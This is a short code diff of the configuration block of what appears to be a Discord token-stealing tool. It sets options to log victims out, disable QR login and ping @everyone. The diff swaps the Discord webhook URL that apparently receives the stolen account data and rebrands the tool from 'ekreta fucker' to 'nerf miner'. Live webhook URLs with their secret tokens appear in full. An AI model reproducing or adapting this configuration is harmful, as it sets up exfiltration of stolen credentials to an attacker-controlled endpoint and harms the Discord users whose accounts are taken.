@@ -14,7 +14,7 @@ const { Webhook } = require('discord-webhook-node')
 var config = {
     brand: "ekreta_fucker",
 
-    webhook: "https://discord.com/api/webhooks/1026932252527034468/EeNHdK3Xq4bQ3kU2IGqHbhz6AqjY60xeYAZM1DIA4mf7fUuWEIQxVc_D7nxhBTTFGI78",
+    webhook: "https://discord.com/api/webhooks/1030149447654588417/H6-LBrsV3vOCU7IFi9aWBBWpLkkTtNHHqCM9Cuasl3sdLI4-6hYMzwmZx0ar5DapNgB4",
 
     logout: true,
     disable_qr_code: true,
@@ -24,13 +24,13 @@ var config = {
     ping: [true, "@everyone"],
 
     embed: {
-        username: "ekreta fucker",
+        username: "nerf miner",
         footer: {
-            text: `ekreta fucker`,
-            icon_url: "https://imgs.search.brave.com/N-9kvAmVSutTgaCanpsI7xMw51dGFLLZtG31JNIGAGg/rs:fit:512:512:1/g:ce/aHR0cDovL3NvYnN6/ZWdlZC5odS9vcmRl/cmVkLzY0MTY5L3Bp/Yy9rcmV0YS5wbmc",
+            text: `nerf miner`,
+            icon_url: "https://i.ytimg.com/vi/ojejp175gD8/maxresdefault.jpg",
         },
         href: "https://fasszopo.kiberesek.com",
-        avatar_url: "https://imgs.search.brave.com/N-9kvAmVSutTgaCanpsI7xMw51dGFLLZtG31JNIGAGg/rs:fit:512:512:1/g:ce/aHR0cDovL3NvYnN6/ZWdlZC5odS9vcmRl/cmVkLzY0MTY5L3Bp/Yy9rcmV0YS5wbmc"
+        avatar_url: "https://i.ytimg.com/vi/ojejp175gD8/maxresdefault.jpg"
     },
 
     badges: {
